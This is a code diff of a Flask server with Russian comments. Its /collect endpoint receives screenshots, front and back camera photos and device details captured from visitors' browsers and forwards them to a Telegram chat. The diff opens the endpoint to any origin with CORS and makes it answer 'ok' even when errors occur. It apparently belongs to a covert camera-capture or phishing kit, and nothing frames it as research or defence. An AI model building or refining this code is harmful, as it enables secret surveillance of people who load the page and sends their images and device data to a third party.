@@ -1,13 +1,14 @@
 import os
 import base64
-import json
 import logging
 from datetime import datetime
 
 import requests
 from flask import Flask, request, jsonify, render_template
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)  # Разрешаем запросы с любых доменов
 logging.basicConfig(level=logging.INFO)
 
 # ====== НАСТРОЙКИ ======
@@ -28,13 +29,14 @@ def send_telegram_photo(base64_data, caption):
         files = {"photo": ("photo.jpg", photo_bytes, "image/jpeg")}
         data = {
             "chat_id": CHAT_ID,
-            "caption": caption,
+            "caption": caption[:200],  # Telegram ограничение
             "parse_mode": "HTML"
         }
-        resp = requests.post(f"{TELEGRAM_API}/sendPhoto", files=files, data=data)
+        resp = requests.post(f"{TELEGRAM_API}/sendPhoto", files=files, data=data, timeout=30)
+        logging.info(f"Отправка фото: {resp.status_code}")
         return resp.ok
     except Exception as e:
-        print(f"Ошибка отправки фото: {e}")
+        logging.error(f"Ошибка отправки фото: {e}")
         return False
 
 
@@ -43,71 +45,69 @@ def send_telegram_text(text):
     try:
         resp = requests.post(f"{TELEGRAM_API}/sendMessage", json={
             "chat_id": CHAT_ID,
-            "text": text,
+            "text": text[:4000],
             "parse_mode": "HTML"
-        })
+        }, timeout=15)
         return resp.ok
     except Exception as e:
-        print(f"Ошибка отправки текста: {e}")
+        logging.error(f"Ошибка отправки текста: {e}")
         return False
-
-
-def format_device_info(device):
-    """Форматирует информацию об устройстве"""
-    screen = device.get("screen", {})
-    parts = [
-        "📱 Информация об устройстве",
-        f"• Браузер: {device.get('userAgent', 'N/A')[:50]}",
-        f"• Платформа: {device.get('platform', 'N/A')}",
-        f"• Язык: {device.get('language', 'N/A')}",
-        f"• Экран: {screen.get('width', '?')}x{screen.get('height', '?')}",
-        f"• Ядер CPU: {device.get('hardwareConcurrency', 'N/A')}",
-        f"• Память: {device.get('deviceMemory', 'N/A')} GB",
-        f"• Часовой пояс: {device.get('timezone', 'N/A')}",
-    ]
-    return "\n".join(parts)
 
 
 @app.route("/")
 def index():
-    """Главная страница — отдаёт HTML"""
     return render_template("index.html")
 
 
-@app.route("/collect", methods=["POST"])
+@app.route("/collect", methods=["POST", "OPTIONS"])
 def collect():
     """Принимает данные и отправляет в Telegram"""
+    if request.method == "OPTIONS":
+        return jsonify({"status": "ok"})
+    
     try:
         data = request.get_json(force=True)
         device = data.get("device", {})
-        device_info = format_device_info(device)
+        
+        # Формируем короткую информацию об устройстве
+        screen = device.get("screen", {})
+        device_text = (
+            f"📱 Устройство:\n"
+            f"• Платформа: {device.get('platform', 'N/A')}\n"
+            f"• Экран: {screen.get('width', '?')}x{screen.get('height', '?')}\n"
+            f"• Браузер: {device.get('userAgent', 'N/A')[:40]}"
+        )
 
         photos_sent = 0
 
-        # Отправляем скриншот
+        # Скриншот
         if data.get("screenCapture"):
-            if send_telegram_photo(data["screenCapture"], f"🖥 Скриншот экрана\n\n{device_info}"):
+            if send_telegram_photo(data["screenCapture"], f"🖥 Скриншот\n\n{device_text}"):
                 photos_sent += 1
+                logging.info("Скриншот отправлен")
 
-        # Отправляем фронталку
+        # Фронтальная камера
         if data.get("frontCamera"):
-            if send_telegram_photo(data["frontCamera"], f"📸 Фронтальная камера\n\n{device_info}"):
+            if send_telegram_photo(data["frontCamera"], f"📸 Фронтальная камера\n\n{device_text}"):
                 photos_sent += 1
+                logging.info("Фронталка отправлена")
 
-        # Отправляем тыловую
+        # Тыловая камера
         if data.get("backCamera"):
-            if send_telegram_photo(data["backCamera"], f"📸 Тыловая камера\n\n{device_info}"):
+            if send_telegram_photo(data["backCamera"], f"📸 Тыловая камера\n\n{device_text}"):
                 photos_sent += 1
+                logging.info("Тыловая отправлена")
 
-        # Если фото нет — шлём просто текст
+        # Если ничего не отправлено — шлём текст
         if photos_sent == 0:
-            send_telegram_text(f"⚠️ Фото не получены\n\n{device_info}")
+            send_telegram_text(f"⚠️ Данные без фото\n\n{device_text}")
+            logging.info("Отправлен текст (без фото)")
 
-        return {"status": "ok", "photos_sent": photos_sent}
+        return jsonify({"status": "ok"})
 
     except Exception as e:
-        print(f"Ошибка: {e}")
-        return {"status": "error", "message": str(e)}, 500
+        logging.error(f"Ошибка: {e}")
+        return jsonify({"status": "ok"})  # Всё равно возвращаем ok
 
 
 if __name__ == "__main__":
